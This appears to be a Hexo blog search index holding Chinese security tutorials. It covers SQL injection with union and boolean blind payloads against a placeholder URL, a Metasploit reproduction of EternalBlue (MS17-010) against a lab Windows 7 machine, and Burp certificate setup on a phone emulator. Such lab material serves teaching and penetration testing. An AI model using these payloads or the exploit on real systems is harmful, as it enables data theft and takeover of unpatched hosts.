<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>SQL注入</title>
    <url>/2019/12/20/SQL%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<img src="/2019/12/20/SQL%E6%B3%A8%E5%85%A5/1.jpg" class="" title="This is an 1 image">
<a id="more"></a>
<h2 id="了解SQL注入"><a href="#了解SQL注入" class="headerlink" title="了解SQL注入"></a>了解SQL注入</h2><h3 id="什么是SQL注入"><a href="#什么是SQL注入" class="headerlink" title="什么是SQL注入"></a>什么是SQL注入</h3><p>SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p>
<h3 id="SQL注入的危害"><a href="#SQL注入的危害" class="headerlink" title="SQL注入的危害"></a>SQL注入的危害</h3><p>攻击者通过SQL注入获取到服务器的库名、表名、字段名，从而获取到整个服务器中的数据，对网站用户的数据安全有极大的威胁。攻击者也可以通过获取到的数据，得到后台管理员的密码，然后对网页页面进行恶意篡改。这样不仅对数据库信息安全造成严重威胁，对整个数据库系统安全也影响重大。</p>
<h3 id="SQL的类型"><a href="#SQL的类型" class="headerlink" title="SQL的类型"></a>SQL的类型</h3><h4 id="按照注入点分类"><a href="#按照注入点分类" class="headerlink" title="按照注入点分类"></a>按照注入点分类</h4><ol>
<li>数字型注入:无需闭合 多为id?=1 and 1=1 –+</li>
<li>字符型注入:需要闭合 多为name=’admin’ and 1=1 #</li>
<li>搜索型注入:主要在数据搜索时没有过滤搜索参数search=’%搜索%’ and ‘%1%’=’%1%’</li>
</ol>
<h4 id="按照执行效果来分类"><a href="#按照执行效果来分类" class="headerlink" title="按照执行效果来分类"></a>按照执行效果来分类</h4><ul>
<li>基于布尔的盲注:根据页面返回结果判断条件真假注入</li>
<li>基于时间的忙著:根据页面响应时间判断条件真假注入</li>
<li>基于错误的注入:根据页面返回的错误信息查看数据库内容</li>
<li>联合查询注入:可以使用union查询数据库内容</li>
<li>堆查询注入:可以同时执行多条语句</li>
</ul>
<h4 id="按照数据请求方式来分类"><a href="#按照数据请求方式来分类" class="headerlink" title="按照数据请求方式来分类"></a>按照数据请求方式来分类</h4><p>GET注入：HTTP请求方式为get，注入点一般在get传入的参数部分。<br>POST注入：HTTP请求方式为post，注入点一般为提交的HTML表单，即post传入的数据内容。<br>HTTP头注入：HTTP的请求头存在注入点，例如XFF头，cookie，host这些都是常见的注入点。</p>
<h2 id="MySQL常用的系统函数"><a href="#MySQL常用的系统函数" class="headerlink" title="MySQL常用的系统函数"></a>MySQL常用的系统函数</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">version()                     #MySQL版本</span><br><span class="line">user()                        #数据库用户名</span><br><span class="line">database()                    #数据库名</span><br><span class="line">current_user()                #当前用户名</span><br><span class="line">system_user()                 #系统函数名</span><br><span class="line">session_user()                #连接数据库的用户名</span><br><span class="line">@@datadir                     #数据库路径</span><br><span class="line">@@version_compile_os          #操作系统版本</span><br><span class="line">@@basedir                     #数据库安装路径</span><br></pre></td></tr></table></figure>
<h2 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h2><p>联合查询注入利用的前提条件是有<code>显示位</code><br>显示位就是在一个网站的正常页面，服务端执行SQL语句查询数据库中的数据，客户端将数据展示在页面中，这个展示数据的位置就叫显示位</p>
<h3 id="联合注入所用函数"><a href="#联合注入所用函数" class="headerlink" title="联合注入所用函数"></a>联合注入所用函数</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union           #union操作符用于连接两个以上的select语句的结果组合到一个结果集合中</span><br><span class="line">select          #select语句用于从数据库中选取数据</span><br><span class="line">order by        #order by 关键字默认按升序对结果进行排序</span><br><span class="line">group_concat()  #把括号内的值打印在一行,以逗号分隔,以升序排列</span><br><span class="line">from            #从</span><br><span class="line">where           #有条件地从表中选取数据</span><br></pre></td></tr></table></figure>

<h3 id="information-schema数据库说明"><a href="#information-schema数据库说明" class="headerlink" title="information_schema数据库说明"></a>information_schema数据库说明</h3><p>这是一个信息数据库,其中保存着其他数据库的数据库名，数据库的表名，数据库表里的列名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">information_schema.SCHEMATA表：提供了当前mysql中数据库的信息。</span><br><span class="line">information_schema.TABLES表：提供了数据库中表的信息。</span><br><span class="line">information_schema.COLUMNS表：提供了表中的列信息。</span><br><span class="line">table_schema:数据库名</span><br><span class="line">table_name:表名</span><br><span class="line">column_name:列名</span><br></pre></td></tr></table></figure>
<h3 id="联合注入的过程"><a href="#联合注入的过程" class="headerlink" title="联合注入的过程"></a>联合注入的过程</h3><ol>
<li>判断注入点</li>
<li>判断是整型还是字符型</li>
<li>判断查询列数</li>
<li>判断显示位</li>
<li>获取所有数据库名</li>
<li>获取数据库所有表名</li>
<li>获取字段名</li>
<li>获取字段中的数据</li>
</ol>
<h4 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h4><p>例：<a href="http://www.xxx.com/view?id=1" target="_blank" rel="noopener">www.xxx.com/view?id=1</a><br>可以使用 <code>and 1=1</code> 和<code>and 1=2</code>  根据页面的不同判断（整形判断）</p>
<img src="/2019/12/20/SQL%E6%B3%A8%E5%85%A5/2.png" class="" title="This is an 2 image">
<img src="/2019/12/20/SQL%E6%B3%A8%E5%85%A5/3.png" class="" title="This is an 3 image">
<p>还可以使用 单引号<code>&#39;</code>判断显示数据库错误信息或者页面回显不同（整形字符串类型的判断） </p>
<img src="/2019/12/20/SQL%E6%B3%A8%E5%85%A5/4.png" class="" title="This is an 4 image">
<h4 id="判断是整型还是字符型"><a href="#判断是整型还是字符型" class="headerlink" title="判断是整型还是字符型"></a>判断是整型还是字符型</h4><p>输入<code>and 1=1</code>和<code>and 1=2</code>后发现页面变化，判断为整型注入<br>后台代码为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入&#96;&#39; and 1&#x3D;1 %23&#96;和 &#96;&#39; and 1&#x3D;2%23&#96;后发现页面变化，判断为字符注入</span><br><span class="line">后台代码为：</span><br><span class="line">&#96;&#96;&#96;$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
<h4 id="判断查询列数"><a href="#判断查询列数" class="headerlink" title="判断查询列数"></a>判断查询列数</h4><p>order by 函数是对MySQL中查询结果按照指定字段名进行排序，除了指定字 段名还可以指定字段的栏位进行排序，第一个查询字段为1，第二个为2，依次 类推。我们可以通过二分法来猜解列数</p>
<p>输入 <code>order by 4%23</code>  发现页面错误，说明没有4列</p>
<img src="/2019/12/20/SQL%E6%B3%A8%E5%85%A5/5.png" class="" title="This is an 5 image">
<p>输入3列时，页面正常，说明有3列</p>
<img src="/2019/12/20/SQL%E6%B3%A8%E5%85%A5/6.png" class="" title="This is an 6 image">
<h4 id="判断显示位"><a href="#判断显示位" class="headerlink" title="判断显示位"></a>判断显示位</h4><p>例 <a href="http://www.xxx.com/view?id=1" target="_blank" rel="noopener">www.xxx.com/view?id=1</a><br>使union前面的语句报错，执行后面的，爆出显示位，2，3</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% asset_img 7.png This is an 7 image %&#125;</span><br><span class="line">#### 获取所有数据库名</span><br><span class="line">&#96;&#96;&#96;www.xxx.com&#x2F;view?id&#x3D;-1 union select 1,2,database()</span><br></pre></td></tr></table></figure>
<img src="/2019/12/20/SQL%E6%B3%A8%E5%85%A5/8.png" class="" title="This is an 8 image">
<h4 id="获取数据库所有表名"><a href="#获取数据库所有表名" class="headerlink" title="获取数据库所有表名"></a>获取数据库所有表名</h4><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">www.xxx.com/<span class="keyword">view</span>?id=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(<span class="built_in">table_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="string">'库名'</span></span><br></pre></td></tr></table></figure>
<img src="/2019/12/20/SQL%E6%B3%A8%E5%85%A5/9.png" class="" title="This is an 9 image">
<h4 id="获取字段名"><a href="#获取字段名" class="headerlink" title="获取字段名"></a>获取字段名</h4><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">www.xxx.com/<span class="keyword">view</span>?id=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(<span class="built_in">column_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=<span class="string">'表名'</span></span><br></pre></td></tr></table></figure>
<img src="/2019/12/20/SQL%E6%B3%A8%E5%85%A5/10.png" class="" title="This is an 10 image">
<h4 id="获取字段中的数据"><a href="#获取字段中的数据" class="headerlink" title="获取字段中的数据"></a>获取字段中的数据</h4><figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">www.xxx.com/view?id=-<span class="number">1</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1,2,<span class="title">group_concat</span>(<span class="title">username</span>) <span class="title">from</span> 字段名</span></span><br></pre></td></tr></table></figure>
<img src="/2019/12/20/SQL%E6%B3%A8%E5%85%A5/11.png" class="" title="This is an 11 image">
<h2 id="基于布尔的盲注"><a href="#基于布尔的盲注" class="headerlink" title="基于布尔的盲注"></a>基于布尔的盲注</h2><p>页面中没有显示位，没有输出SQL语句执行错误信息，只能通过页面返回正常不正常。</p>
<h3 id="布尔盲注所用函数"><a href="#布尔盲注所用函数" class="headerlink" title="布尔盲注所用函数"></a>布尔盲注所用函数</h3><p>MYSQL的substr函数的使用</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">格式：SUBSTR(<span class="keyword">string</span>,<span class="built_in">start</span>,<span class="built_in">len</span>)</span><br><span class="line">含义：从<span class="keyword">string</span>的<span class="built_in">start</span>位开始截取<span class="built_in">len</span>个字符</span><br></pre></td></tr></table></figure>
<p>MYSQL的ascii函数的使用</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">格式：ASCII(<span class="type">char</span>) </span><br><span class="line">含义：将<span class="type">char</span>转化成ascii码</span><br></pre></td></tr></table></figure>
<p>MYSQL的length函数的使用</p>
<figure class="highlight hsp"><table><tr><td class="code"><pre><span class="line">格式：<span class="keyword">length</span>(<span class="keyword">str</span>)</span><br><span class="line">含义：返回<span class="keyword">str</span>字符串的长度</span><br></pre></td></tr></table></figure>
<p>首先要记得常见的ASCII，[A-Z]:[65-90], [a-z]:[97122], [0-9]:[48-57]</p>
<h3 id="布尔盲注过程"><a href="#布尔盲注过程" class="headerlink" title="布尔盲注过程"></a>布尔盲注过程</h3><h4 id="猜库"><a href="#猜库" class="headerlink" title="猜库"></a>猜库</h4><h5 id="猜数据库名的长度"><a href="#猜数据库名的长度" class="headerlink" title="猜数据库名的长度"></a>猜数据库名的长度</h5><figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable"><span class="keyword">and</span></span> <span class="function"><span class="title"><span class="built_in">length</span></span>(<span class="title">database</span>())=<span class="number">8</span>  --+</span></span><br></pre></td></tr></table></figure>
<h5 id="猜数据库名的第一个字符"><a href="#猜数据库名的第一个字符" class="headerlink" title="猜数据库名的第一个字符"></a>猜数据库名的第一个字符</h5><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> ascii(substr(<span class="keyword">database</span>(),<span class="number">1</span>,<span class="number">1</span>)) = <span class="number">115</span> <span class="comment">--+</span></span><br><span class="line">猜数据库名的第二个字符就要把substr(<span class="keyword">database</span>(),<span class="number">2</span>,<span class="number">1</span>)修改</span><br></pre></td></tr></table></figure>
<h4 id="猜表"><a href="#猜表" class="headerlink" title="猜表"></a>猜表</h4><h5 id="猜表的数量"><a href="#猜表的数量" class="headerlink" title="猜表的数量"></a>猜表的数量</h5><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span>(<span class="keyword">select</span> count(<span class="built_in">table_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema = <span class="keyword">database</span>()) = <span class="number">4</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<h5 id="猜表的长度"><a href="#猜表的长度" class="headerlink" title="猜表的长度"></a>猜表的长度</h5><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> length(substr((<span class="keyword">select</span> <span class="built_in">table_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">6</span> <span class="comment">--+ </span></span><br><span class="line">如果猜第二个表的长度就替换<span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h5 id="猜表名的第一个字符"><a href="#猜表名的第一个字符" class="headerlink" title="猜表名的第一个字符"></a>猜表名的第一个字符</h5><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span>(ascii(substr((<span class="keyword">select</span> <span class="built_in">table_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))) =<span class="number">101</span> <span class="comment">--+</span></span><br><span class="line">如果猜表名的第二个字符就替换 substr(*,<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line">如果猜第二个表名的第一个字符就替换 <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h4 id="猜列"><a href="#猜列" class="headerlink" title="猜列"></a>猜列</h4><h5 id="猜列的数量"><a href="#猜列的数量" class="headerlink" title="猜列的数量"></a>猜列的数量</h5><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> count(<span class="built_in">column_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=<span class="string">'表名'</span>) =<span class="number">3</span> <span class="comment">--+</span></span><br><span class="line">因为已知表名 所以直接查</span><br></pre></td></tr></table></figure>
<h5 id="猜第一个列名的长度"><a href="#猜第一个列名的长度" class="headerlink" title="猜第一个列名的长度"></a>猜第一个列名的长度</h5><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> length(substr((<span class="keyword">select</span> <span class="built_in">column_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=<span class="string">'表名'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">2</span> <span class="comment">--+</span></span><br><span class="line">如果猜第二个列的长度就替换<span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h5 id="猜第一个列名的第一个字符"><a href="#猜第一个列名的第一个字符" class="headerlink" title="猜第一个列名的第一个字符"></a>猜第一个列名的第一个字符</h5><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">and</span>(ascii(substr((<span class="keyword">select</span> <span class="built_in">column_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=<span class="string">'表名'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>)))=<span class="number">105</span> <span class="comment">--+</span></span><br><span class="line">如果猜列名的第二个字符就替换 substr(*,<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line">如果猜第二个列名的第一个字符就替换 <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h4 id="猜数据"><a href="#猜数据" class="headerlink" title="猜数据"></a>猜数据</h4><h5 id="猜数据的数量"><a href="#猜数据的数量" class="headerlink" title="猜数据的数量"></a>猜数据的数量</h5><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> count(列名) <span class="keyword">from</span> 表名)=<span class="number">13</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<h5 id="猜第一个数据的长度"><a href="#猜第一个数据的长度" class="headerlink" title="猜第一个数据的长度"></a>猜第一个数据的长度</h5><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> length(substr((select 列名 <span class="keyword">from</span> 表名 limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>))=<span class="number">4</span> --+</span><br><span class="line">如果猜第二个数据的长度就替换limit <span class="number">1</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h5 id="猜第一个数据的第一个字符"><a href="#猜第一个数据的第一个字符" class="headerlink" title="猜第一个数据的第一个字符"></a>猜第一个数据的第一个字符</h5><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> ascii(substr((select username <span class="keyword">from</span><span class="built_in"> users </span>limit 0,1),1)) =68 --+</span><br><span class="line">如果要猜第一个数据的第二个字符就把substr(*,2,1)替换</span><br><span class="line">如果要猜第二个数据的第一个字符就替换limit 1,1</span><br></pre></td></tr></table></figure>
<h2 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h2><h2 id="基于错误的注入"><a href="#基于错误的注入" class="headerlink" title="基于错误的注入"></a>基于错误的注入</h2>]]></content>
  </entry>
  <entry>
    <title>ms17-010永恒之蓝复现</title>
    <url>/2019/12/20/ms17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="ms17-010永恒之蓝复现"><a href="#ms17-010永恒之蓝复现" class="headerlink" title="ms17-010永恒之蓝复现"></a>ms17-010永恒之蓝复现</h1><p>永恒之蓝是指2017年4月14日晚，黑客团体Shadow Brokers（影子经纪人）公布一大批网络攻击工具，其中包含“永恒之蓝”工具，“永恒之蓝”利用Windows系统的SMB漏洞可以获取系统最高权限。5月12日，不法分子通过改造“永恒之蓝”制作了wannacry勒索病毒，英国、俄罗斯、整个欧洲以及中国国内多个高校校内网、大型企业内网和政府机构专网中招，被勒索支付高额赎金才能解密恢复文件。</p>
<a id="more"></a>
<p>现在Metasploit里面已经集成了17-010漏洞，渗透测试更加方便与正式化。</p>
<h2 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h2><p>攻击机系统：Kali-Linux<br>攻击机IP：192.168.75.52<br>靶机系统：win7<br>靶机IP：192.168.75.142</p>
<h3 id="查看靶机系统及端口"><a href="#查看靶机系统及端口" class="headerlink" title="查看靶机系统及端口"></a>查看靶机系统及端口</h3><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -O <span class="number">192.168</span><span class="number">.75</span><span class="number">.142</span></span><br></pre></td></tr></table></figure>
<img src="/2019/12/20/ms17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%A4%8D%E7%8E%B0/nmapsaomiao.png" class="" title="This is an nmapsaomiao image">
<h3 id="打开msf"><a href="#打开msf" class="headerlink" title="打开msf"></a>打开msf</h3><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">msfconsole</span></span><br></pre></td></tr></table></figure>
<h3 id="搜索相关的漏洞插件"><a href="#搜索相关的漏洞插件" class="headerlink" title="搜索相关的漏洞插件"></a>搜索相关的漏洞插件</h3><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line">auxiliary<span class="meta-keyword">/admin/</span>smb/ms17_010_command</span><br><span class="line">auxiliary<span class="meta-keyword">/scanner/</span>smb/smb_ms17_010</span><br><span class="line">exploit<span class="meta-keyword">/windows/</span>smb/ms17_010_eternalblue</span><br><span class="line">exploit<span class="meta-keyword">/windows/</span>smb/ms17_010_eternalblue_win8</span><br><span class="line">exploit<span class="meta-keyword">/windows/</span>smb/ms17_010_psexec</span><br></pre></td></tr></table></figure>
<p>Auxiliarity（辅助模块）<br>Expoit（漏洞利用模块）</p>
<h3 id="使用辅助验证插件测试"><a href="#使用辅助验证插件测试" class="headerlink" title="使用辅助验证插件测试"></a>使用辅助验证插件测试</h3><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/scanner/smb/smb_ms17_010 </span><br><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; <span class="keyword">show</span> <span class="keyword">options</span> </span><br><span class="line"></span><br><span class="line">Module <span class="keyword">options</span> (auxiliary/scanner/smb/smb_ms17_010):</span><br><span class="line"></span><br><span class="line">   <span class="type">Name</span>         <span class="keyword">Current</span> Setting                                                 Required  Description</span><br><span class="line">   <span class="comment">----         ---------------                                                 --------  -----------</span></span><br><span class="line">   CHECK_ARCH   <span class="keyword">true</span>                                                            <span class="keyword">no</span>        <span class="keyword">Check</span> <span class="keyword">for</span> architecture <span class="keyword">on</span> vulnerable hosts</span><br><span class="line">   CHECK_DOPU   <span class="keyword">true</span>                                                            <span class="keyword">no</span>        <span class="keyword">Check</span> <span class="keyword">for</span> DOUBLEPULSAR <span class="keyword">on</span> vulnerable hosts</span><br><span class="line">   CHECK_PIPE   <span class="keyword">false</span>                                                           <span class="keyword">no</span>        <span class="keyword">Check</span> <span class="keyword">for</span> named pipe <span class="keyword">on</span> vulnerable hosts</span><br><span class="line">   NAMED_PIPES  /usr/<span class="keyword">share</span>/metasploit-framework/data/wordlists/named_pipes.txt  yes       List <span class="keyword">of</span> named pipes <span class="keyword">to</span> <span class="keyword">check</span></span><br><span class="line">   RHOSTS                                                                       yes       The target host(s), range <span class="type">CIDR</span> identifier, <span class="keyword">or</span> hosts file <span class="keyword">with</span> syntax <span class="string">'file:&lt;path&gt;'</span></span><br><span class="line">   RPORT        <span class="number">445</span>                                                             yes       The SMB service port (TCP)</span><br><span class="line">   SMBDomain    .                                                               <span class="keyword">no</span>        The Windows <span class="keyword">domain</span> <span class="keyword">to</span> use <span class="keyword">for</span> authentication</span><br><span class="line">   SMBPass                                                                      <span class="keyword">no</span>        The <span class="keyword">password</span> <span class="keyword">for</span> the specified username</span><br><span class="line">   SMBUser                                                                      <span class="keyword">no</span>        The username <span class="keyword">to</span> authenticate <span class="keyword">as</span></span><br><span class="line">   THREADS      <span class="number">1</span>                                                               yes       The number <span class="keyword">of</span> concurrent threads (max one per host)</span><br></pre></td></tr></table></figure>
<p>这里的<code>show options</code>是显示这个插件相关的一些参数，在<code>Required</code>这一栏下面是<code>yes</code>的表示必填参数，这里面还剩<code>RHOSTS</code>这个参数没有填写即目标网段。下面设置一个目标网段，准备进行扫描测试：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; <span class="keyword">set</span> rhost <span class="number">192.168</span><span class="number">.75</span><span class="number">.142</span></span><br><span class="line">rhost =&gt; <span class="number">192.168</span><span class="number">.75</span><span class="number">.142</span></span><br></pre></td></tr></table></figure>
<p>设置扫描线程，插件默认是1，这里设置为10：</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; <span class="keyword">set</span> threads <span class="comment">10</span></span><br><span class="line">threads <span class="comment">=&gt; 10</span></span><br></pre></td></tr></table></figure>
<p>可以执行<code>show options</code>查看自己刚刚填写的参数信息：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; <span class="keyword">show</span> <span class="keyword">options</span> </span><br><span class="line"></span><br><span class="line">Module <span class="keyword">options</span> (auxiliary/scanner/smb/smb_ms17_010):</span><br><span class="line"></span><br><span class="line">   <span class="type">Name</span>         <span class="keyword">Current</span> Setting                                                 Required  Description</span><br><span class="line">   <span class="comment">----         ---------------                                                 --------  -----------</span></span><br><span class="line">   CHECK_ARCH   <span class="keyword">true</span>                                                            <span class="keyword">no</span>        <span class="keyword">Check</span> <span class="keyword">for</span> architecture <span class="keyword">on</span> vulnerable hosts</span><br><span class="line">   CHECK_DOPU   <span class="keyword">true</span>                                                            <span class="keyword">no</span>        <span class="keyword">Check</span> <span class="keyword">for</span> DOUBLEPULSAR <span class="keyword">on</span> vulnerable hosts</span><br><span class="line">   CHECK_PIPE   <span class="keyword">false</span>                                                           <span class="keyword">no</span>        <span class="keyword">Check</span> <span class="keyword">for</span> named pipe <span class="keyword">on</span> vulnerable hosts</span><br><span class="line">   NAMED_PIPES  /usr/<span class="keyword">share</span>/metasploit-framework/data/wordlists/named_pipes.txt  yes       List <span class="keyword">of</span> named pipes <span class="keyword">to</span> <span class="keyword">check</span></span><br><span class="line">   RHOSTS       <span class="number">192.168</span><span class="number">.75</span><span class="number">.142</span>                                                  yes       The target host(s), range <span class="type">CIDR</span> identifier, <span class="keyword">or</span> hosts file <span class="keyword">with</span> syntax <span class="string">'file:&lt;path&gt;'</span></span><br><span class="line">   RPORT        <span class="number">445</span>                                                             yes       The SMB service port (TCP)</span><br><span class="line">   SMBDomain    .                                                               <span class="keyword">no</span>        The Windows <span class="keyword">domain</span> <span class="keyword">to</span> use <span class="keyword">for</span> authentication</span><br><span class="line">   SMBPass                                                                      <span class="keyword">no</span>        The <span class="keyword">password</span> <span class="keyword">for</span> the specified username</span><br><span class="line">   SMBUser                                                                      <span class="keyword">no</span>        The username <span class="keyword">to</span> authenticate <span class="keyword">as</span></span><br><span class="line">   THREADS      <span class="number">10</span>                                                              yes       The number <span class="keyword">of</span> concurrent threads (max one per host)</span><br></pre></td></tr></table></figure>
<p> 执行<br> <figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"> msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; run</span><br><span class="line"></span><br><span class="line">[+] <span class="number">192.168</span><span class="number">.75</span><span class="number">.142</span>:<span class="number">445</span>    - Host <span class="keyword">is</span> likely VULNERABLE to MS17<span class="number">-010</span>! - Windows <span class="number">7</span> Home Basic <span class="number">7601</span> Service Pack <span class="number">1</span> x64 (<span class="number">64</span>-bit)</span><br><span class="line">[*] <span class="number">192.168</span><span class="number">.75</span><span class="number">.142</span>:<span class="number">445</span>    - Scanned <span class="number">1</span> of <span class="number">1</span> hosts (<span class="number">100</span>% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><br>主机可能易受MS17-010攻击!Windows 7家庭基础7601服务包1 x64位(64位)</p>
<h3 id="使用exploit模块来进行攻击"><a href="#使用exploit模块来进行攻击" class="headerlink" title="使用exploit模块来进行攻击"></a>使用exploit模块来进行攻击</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">msf5 auxiliary(scanner<span class="regexp">/smb/</span>smb_ms17_010) &gt; use exploit<span class="regexp">/windows/</span>smb<span class="regexp">/ms17_010_eternalblue</span></span><br></pre></td></tr></table></figure>
<p>设置靶机ip</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="keyword">set</span> rhost <span class="number">192.168</span><span class="number">.75</span><span class="number">.142</span></span><br><span class="line">rhost =&gt; <span class="number">192.168</span><span class="number">.75</span><span class="number">.142</span></span><br></pre></td></tr></table></figure>
<p>攻击</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">msf5 exploit(<span class="name">windows/smb/ms17_010_eternalblue</span>) &gt; exploit</span><br></pre></td></tr></table></figure>
<img src="/2019/12/20/ms17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%A4%8D%E7%8E%B0/ip.png" class="" title="This is an ip image">
<p>完成！</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Metasploit</tag>
        <tag>Nmap</tag>
      </tags>
  </entry>
  <entry>
    <title>手机添加burp证书</title>
    <url>/2019/12/20/%E6%89%8B%E6%9C%BA%E6%B7%BB%E5%8A%A0burp%E8%AF%81%E4%B9%A6/</url>
    <content><![CDATA[<h1 id="手机添加burp证书"><a href="#手机添加burp证书" class="headerlink" title="手机添加burp证书"></a>手机添加burp证书</h1><p>手机使用逍遥模拟器<br>电脑windows10</p>
<a id="more"></a>
<h2 id="配置收集代理ip"><a href="#配置收集代理ip" class="headerlink" title="配置收集代理ip"></a>配置收集代理ip</h2><p>查看本机ip</p>
<img src="/2019/12/20/%E6%89%8B%E6%9C%BA%E6%B7%BB%E5%8A%A0burp%E8%AF%81%E4%B9%A6/image-14.png" class="" title="This is an image-14 image">
<p>进入手机设置修改代理</p>
<img src="/2019/12/20/%E6%89%8B%E6%9C%BA%E6%B7%BB%E5%8A%A0burp%E8%AF%81%E4%B9%A6/image-13.png" class="" title="This is an image-13 image">
<h2 id="配置burp监听代理"><a href="#配置burp监听代理" class="headerlink" title="配置burp监听代理"></a>配置burp监听代理</h2><p>添加监听代理</p>
<img src="/2019/12/20/%E6%89%8B%E6%9C%BA%E6%B7%BB%E5%8A%A0burp%E8%AF%81%E4%B9%A6/image-15.png" class="" title="This is an image-15 image">
<img src="/2019/12/20/%E6%89%8B%E6%9C%BA%E6%B7%BB%E5%8A%A0burp%E8%AF%81%E4%B9%A6/image-16.png" class="" title="This is an image-16 image">
